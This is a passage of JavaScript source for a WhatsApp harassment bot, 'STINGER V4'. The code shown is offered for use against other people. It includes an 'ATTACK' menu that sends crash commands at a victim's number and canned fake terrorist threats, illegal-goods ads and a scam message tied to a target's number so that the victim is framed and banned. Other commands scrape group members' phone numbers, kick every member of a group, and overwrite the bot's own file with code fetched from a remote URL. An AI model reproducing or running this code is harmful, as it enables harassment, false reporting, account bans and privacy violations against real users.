> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break

case "owner": {
if (!isPremium) return reply('Mau Ngapain Dek ??')
const repf = await zyn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
zyn.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "add-sting":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'set-sting': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'sting-off': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = false
reply('❄️ `𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐈𝐒 𝐍𝐎𝐖 𝐈𝐍𝐀𝐂𝐓𝐈𝐕𝐄`❄️')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zyn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'sting-on': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = true
reply('❄️ `𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐈𝐒 𝐍𝐎𝐖 𝐀𝐂𝐓𝐈𝐕𝐄`❄️')
}
break

case 'sting-save': {
if (!isOwner) return reply(mess.only.owner)
let cmiggc = await zyn.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
reply('\n`🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐢𝐬 𝐒𝐚𝐯𝐢𝐧𝐠 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬, 𝐊𝐢𝐧𝐝𝐥𝐲 𝐇𝐨𝐥𝐝 𝐨𝐧..🧊` '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
zyn.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: '𝐒𝐭𝐢𝐧𝐠𝐞𝐫-𝐕𝟒.vcf', caption: '\n `❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 𝐅𝐈𝐋𝐄❄️` \n\n𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐒𝐚𝐯𝐞𝐝✨\n𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞✨: *'+cmiggc.subject+'*\n𝐍𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬✨: *'+cmiggc.participants.length+'*\n\n𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐄𝐬 𝐓𝐞𝐚𝐦𝐬 𝐓𝐞𝐜𝐡™'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break

case 'menu': {
if (!isOwner) return reply(mess.only.owner)
reply(' `🧊𝐓𝐲𝐩𝐞 [.𝐬𝐭𝐢𝐧𝐠𝐞𝐫 ] 𝐭𝐨 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐌𝐞𝐧𝐮🧊`')
}
break

case 'sting-del': {
if (!m.quoted) return reply('Reply to the message you want to delete')
await zyn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromObject: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
reply(' `❄𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞❄`')
}
break

break
case "sting-ban":{
if (!isOwner) return reply("Special Features for Certain Users!!")
const mtban1 = `Hello, I'm Ditzz Zuckerberg, I'm a terrorist from Indonesia, I'm going to kill you in the United States (USA), aiming for your head Mark Zuckerberg 👿, if you don't want to be killed then you have to contact me via the WhatsApp app 🔪👇
                        https: //api.whatsapp.com/send?phone=+234`
await reply(mtban1);
}
break;

case "sting-ban2": {
if (!isOwner) return reply("Special Features for Certain Users!!")
const mtban2 = `Hello, I am the terrorist who received orders from Ditzz Zuckerberg, to kill you Mark Zuckerberg 🔪👿.
https://api.whatsapp.com/send?phone=+234`
await reply(mtban2);
} 
break;

case "sting-ban3": {
if (!isOwner) return reply("Special Features for Certain Users!!")
const mtban3 = `I sell illegal items such as 👇
                        Drugs
                        Firearms
                        Human organs 👿
                        Woman's vagina
                        Porn video 🔞
                        Sexual children 👿

                        If you want to order, contact me on WhatsApp 👿👇
                        https://api.whatsapp.com/send?phone=+234`
                        await reply(mtban3);
}
break;

case 'sting-ai': {
if (!text) return reply(`Example:  what is your name`);   
try {
let gpt = await (await fetch(`https://apitoxxictechinc.vercel.app/api/chat?question=${text}&apikey=toxxicboy`)).json();
await reply(gpt.data.response);
                                        } catch (error) {
await reply('An error occurred, please try again later.');
}
}
break

case "runtime":
let runtimetext = `
     ╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
        𝐇𝐞𝐥𝐥𝐨 @${sender.split("@")[0]}
        𝐑𝐮𝐧𝐭𝐢𝐦𝐞 :𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(
                                        process.uptime()
                                    )}`;
                                    zyn.sendMessage(
                                        m.chat,
                                        {
                                            text: runtimetext,
                                            contextInfo: {
                                                externalAdReply: {
                                                    showAdAttribution: true,
                                                    title: `${namabot}`,
                                                    body: `𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇™`,
                                                    thumbnailUrl:
                                                    "https://i.ibb.co/BnYRXcw/STINGER-V4.jpg",
                                                    sourceUrl: global.link,
                                                    mediaType: 1,
                                                    renderLargerThumbnail: true
                                                }
                                            }
                                        },
                                        {
                                            quoted: m
                                        }
                                    );
                    break
                    
case 'sting-anime': {
await loading()
const dir = [
                            'https://telegra.ph/file/0d4fb93951c620aacb229.mp4',
                            'https://g.top4top.io/m_2391c90iu1.mp4',
                            'https://h.top4top.io/m_2391mfvy22.mp4',
                            'https://i.top4top.io/m_2391iwmee3.mp4',
                            'https://j.top4top.io/m_23915x5204.mp4',
                            'https://l.top4top.io/m_2391e795x5.mp4',
                            'https://a.top4top.io/m_2391jcee66.mp4',
                            'https://b.top4top.io/m_2391ho0bz7.mp4',
                            'https://c.top4top.io/m_23910hulw8.mp4',
                            'https://d.top4top.io/m_2391dj01a9.mp4',
                            'https://e.top4top.io/m_23912fdr210.mp4',
                            'https://a.top4top.io/m_23911dhqx1.mp4',
                            'https://b.top4top.io/m_2391wwr402.mp4',
                            'https://c.top4top.io/m_2391vfkp63.mp4',
                            'https://d.top4top.io/m_2391b7cey4.mp4',
                            'https://e.top4top.io/m_2391fxdc85.mp4',
                            'https://telegra.ph/file/c3deeb5b0b7f7738a95ad.mp4',
                            'https://telegra.ph/file/7ca9eef850f5edc53f7f2.mp4',
                            'https://telegra.ph/file/44f73812ae0c19f097264.mp4',
                            'https://telegra.ph/file/10399f910bb90de8a6c53.mp4',
                            'https://telegra.ph/file/f7b440b02e742d1d4bed6.mp4',
                            'https://telegra.ph/file/3571f86c9c8843f48ce03.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/fbfa5ac6baca454de22ad.mp4',
                            'https://telegra.ph/file/899cb30e29de1f0692ea1.mp4',
                            'https://telegra.ph/file/30e226e2d30e51bda678f.mp4',
                            'https://telegra.ph/file/4b20016e2f4ff925470fea.mp4',
                            'https://telegra.ph/file/d48fde63f91f9aa585716.mp4',
                            'https://telegra.ph/file/3a1f2afb1172b4606cd50.mp4',
                            'https://telegra.ph/file/fe7de67cadcddf80e4f23.mp4',
                            'https://telegra.ph/file/f4eabe96d994b28b7020d.mp4',
                            'https://telegra.ph/file/f8adc8f3af8ce6f80254b.mp4',
                            'https://telegra.ph/file/909a4beb3be92dae9e8ef.mp4',
                            'https://telegra.ph/file/57dff983fe52d49cf9e11.mp4',
                            'https://telegra.ph/file/70ed984ecf1382e0e74ce.mp4',
                            'https://telegra.ph/file/a922d3d0214e7b95dfb89.mp4',
                            'https://telegra.ph/file/ff7a0e8598bfd47898932.mp4',
                            'https://telegra.ph/file/c992c64d4bb59df46f06e.mp4',
                            'https://telegra.ph/file/137346459c02371cf5de9.mp4',
                            'https://telegra.ph/file/2ae60a3fc1509f779cba0.mp4',
                            'https://telegra.ph/file/223ac432cbca27313c59c.mp4',
                            'https://telegra.ph/file/6411bbcedc5da320b8656.mp4',
                            'https://telegra.ph/file/33a005837185d86435a26.mp4',
                            'https://telegra.ph/file/3b5cf36d1fc154ee36345.mp4',
                            'https://telegra.ph/file/c5606fb2547f4c8268f1bb.mp4',
                            'https://telegra.ph/file/a91ba184bd2faedf2ca93.mp4',
                            'https://telegra.ph/file/aebad466be77f72498981.mp4',
                            'https://telegra.ph/file/a38ff1a80c53fb374af90.mp4',
                            'https://telegra.ph/file/607217019e1e5952920c1.mp4',
                            'https://telegra.ph/file/8a98532caa714b28acce1.mp4',
                            'https://telegra.ph/file/9eb4be5e79b7e71bfecc5.mp4',
                            'https://telegra.ph/file/10bbd3972f7b75a8b2ef6.mp4',
                            'https://telegra.ph/file/3fae1c6aacaba812ea651.mp4',
                            'https://telegra.ph/file/68378ab14e55b8a4113c2.mp4',
                            'https://telegra.ph/file/9cb140f6f74012cce30c7.mp4',
                            'https://telegra.ph/file/17a3d58921c2754cf86ef.mp4',
                            'https://telegra.ph/file/3ac2c8447b8915a879e7a.mp4',
                            'https://telegra.ph/file/269cd09dcf42f8bd3a6f9.mp4',
                            'https://telegra.ph/file/d2e59e56cfdaac79ca7f8.mp4',
                            'https://telegra.ph/file/504ac80844f99a8e3fc54.mp4',
                            'https://telegra.ph/file/dd2b8fba0010f539085d1.mp4',
                            'https://telegra.ph/file/af9726aad0dce10dc4529.mp4',
                            'https://telegra.ph/file/c693724dba3bb96bb6c70.mp4',
                            'https://telegra.ph/file/5b91438135d01c11e7c92.mp4',
                            'https://telegra.ph/file/d2a468ff7cd4c29dcdb4a.mp4',
                            'https://telegra.ph/file/9cc245954979317b3484c.mp4',
                            'https://telegra.ph/file/cde12f0fd2c73ab8eb933.mp4',
                            'https://telegra.ph/file/ab58119a87c7f2c2367dc.mp4',
                            'https://telegra.ph/file/9146e2d5490c1b01c6e87.mp4',
                            'https://telegra.ph/file/09c9e72d3e0d44175c304.mp4',
                            'https://telegra.ph/file/2f01ddd037c40477ed07f.mp4',
                            'https://telegra.ph/file/be72f95d92490f0a1db3b.mp4',
                            'https://telegra.ph/file/d1464f070543fb3aaeaee.mp4',
                            'https://telegra.ph/file/99f02aa82825f1bf61e9a.mp4',
                            'https://telegra.ph/file/d540762b1d4f9e767357d.mp4',
                            'https://telegra.ph/file/98d09d227e8552d4e2bea.mp4',
                            'https://telegra.ph/file/4a9dc4ba09484791dfa9a.mp4',
                            'https://telegra.ph/file/91d8701c2783775637125.mp4',
                        ]
                        await zyn.sendMessage(m.chat, {
                            video: {
                                url: dir[Math.floor(Math.random() * dir.length)]
                            }, caption: `*𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒™*`
                        }, {
                            quoted: m
                        })
                    }
                    break
                    
                          case 'kickall': {
                              
                            if (!isAdmins && !isOwner) return reply('Khusus Admin')
                            if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
                         zyn.sendMessage(from, { react: { text: "🥺", key: m.key } })
                            const delay = time => new Promise(res => setTimeout(res, time));
                            let mentioned = participants.map(v => v.jid)
                        await reply("Kicking all members")
                            for (let member of mentioned) {
                              zyn.groupParticipantsUpdate(m.chat, [member], 'remove')
                            }
                          }
break

case 'sting-ban4': {
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply('Enter the Target number Prefix "+" and Country Code')
await zyn.sendMessage(m.chat, {text: `Earn money easily online for 1 hour at 10 thousand💰.\nOnly in this survey, register your account immediately, all you need is a WhatsApp number ready to go online 🤑.\nNo Miss this opportunity, register now using the QR code 📄\n\nReply with “1” and click on the link below 👇\nhttps://server.go-share.top/\n\nAnd connect with my WhatsApp if you want to get Bonus!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
return reply(`👆 text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
}
break

case 'sting-block': {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) {
reply(`Example: ${prefix + command} 𝟐𝟑𝟒𝐱𝐱𝐱`)
} else {
const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
await zyn.updateBlockStatus(numbersOnly, 'block').then((a) => reply(mess.done)).catch((err) => reply(' `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐜𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐕𝐢𝐜𝐭𝐢𝐦🧊`'))
}
}
break

case 'sting-unblock': {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) {
reply(`Example: ${prefix + command} 𝟐𝟑𝟒𝐱𝐱𝐱`)
} else {
const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
await zyn.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcxlicon(mess.done)).catch((err) => reply(' `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐒𝐮𝐜𝐜𝐜𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐔𝐧𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐕𝐢𝐜𝐭𝐢𝐦🧊`'))
}
}
break

case 'sting-update': {
                if (!isOwner) return reply(mess.only.owner);

                reply(" `🧊𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐈𝐒 𝐍𝐎𝐖 𝐔𝐏𝐃𝐀𝐓𝐈𝐍𝐆🧊`");
                try {
                    const githubRawUrl = 'https://raw.githubusercontent.com/paskito002/STINGER-V4/refs/heads/main/STINGER-V4.js';
                    const response = await fetch(githubRawUrl);

                    if (!response.ok) {
                        return reply(`Failed to fetch the file: ${response.statusText}`);
                    }

                    const newFileContent = await response.text();

                    // Update the byxx file
                    const fs = require('fs');
                    fs.writeFileSync('./STINGER-V4.js', newFileContent, 'utf8');

                    reply(" `🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐭𝐨 𝐭𝐡𝐞 𝐋𝐚𝐭𝐞𝐬𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧🧊`");
                } catch (error) {
                    console.error("Error updating file:", error);
                    reply("Failed to update file. Please check the console for errors.");
}
}
break

case 'test': {
if (!isOwner) return reply(mess.only.owner)
reply(' `🧊𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒 𝐈𝐒 𝐂𝐔𝐑𝐑𝐄𝐍𝐓𝐋𝐘 𝐀𝐂𝐓𝐈𝐕𝐄🧊`')
}
break

case 'sting-pay': {
if (!isOwner) return reply(mess.only.owner)
reply('`☺️𝐌𝐚𝐤𝐞 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐨𝐟 𝟑𝐤 𝐍𝐚𝐢𝐫𝐚 𝐭𝐨 𝐭𝐡𝐢𝐬 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 👉𝐀𝐜𝐜𝐭 𝐍𝐨: 𝟐𝟒𝟎𝟗𝟏𝟑𝟗𝟐𝟖𝟐❄️𝐍𝐚𝐦𝐞👉𝐏𝐚𝐬𝐜𝐡𝐚𝐥𝐉𝐄👉𝐁𝐚𝐧𝐤👉𝐙𝐞𝐧𝐢𝐭𝐡𝐁𝐚𝐧𝐤☺️`')
}
break

case 'confirm-pay': {
zyn.sendMessage(`2349037524605@s.whatsapp.net`, { text: `\`💫𝐇𝐢 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒💫\`
  🧊𝐈 𝐡𝐚𝐯𝐞 𝐣𝐮𝐬𝐭 𝐦𝐚𝐝𝐞 𝐚 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 𝐟𝐨𝐫 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐏𝐫𝐞𝐦𝐢𝐮𝐦`})
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await zyn.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} STINGER-V4`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await zyn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Zyn - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/STINGER-V4.jpg')}, { upload: zyn.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice Zyn - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await zyn.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'stinger-blast': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "❄️𝐀𝐍𝐃𝐑𝐎❄️",
						rows: [{
							title: '𝐙𝐲𝐧 𝐀𝐧𝐝𝐫𝐨',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐀𝐍𝐃𝐑𝐎❄️",
						rows: [{
							title: '𝐓𝐫𝐚𝐬𝐡 𝐋𝐨𝐜',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐀𝐍𝐃𝐑𝐎❄️",
						rows: [{
							title: '𝐈𝐧𝐯𝐢𝐬𝐢𝐱 𝐂𝐫𝐚𝐬𝐡',
							id: `sting-atk ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "❄️𝐀𝐏𝐏𝐋𝐄❄️",
						rows: [{
							title: '𝐂𝐫𝐚𝐬𝐡 𝐈𝐨𝐬',
							id: `sting-ios ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐀𝐏𝐏𝐋𝐄❄️",
						rows: [{
							title: '𝐊𝐢𝐥𝐥 𝐈𝐨𝐬',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐀𝐏𝐏𝐋𝐄❄️",
						rows: [{
							title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜️𝐒𝐓𝐈𝐍𝐆𝐄𝐑⌟',
						highlight_label: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
						rows: [{
							title: '𝐂𝐫𝐚𝐬𝐡 𝐅𝐥𝐨𝐰',
							id: `sting-crash ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
						rows: [{
							title: '𝐕𝐚𝐬𝐢𝐨𝐧',
							id: `vasion ${target}`
						}]
					},
					{
						highlight_label: "❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
						rows: [{
							title: '𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰',
							id: `overflow ${target}`
						}]
					}]
let listMessage = {
    title: '⿻ ⌜ ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️ ⌟ ⿻', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`𝐀𝐓𝐓𝐀𝐂𝐊 : ${target}`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: " S҉ T҉ I҉ N҉ G҉ E҉ R҉",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/ES_TEAMS.jpg")}, { upload: zyn.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.con/@esteams\",\"merchant_url\":\"https://youtube.com/@esteams\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await zyn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
//const name = await zyn.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await zyn.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
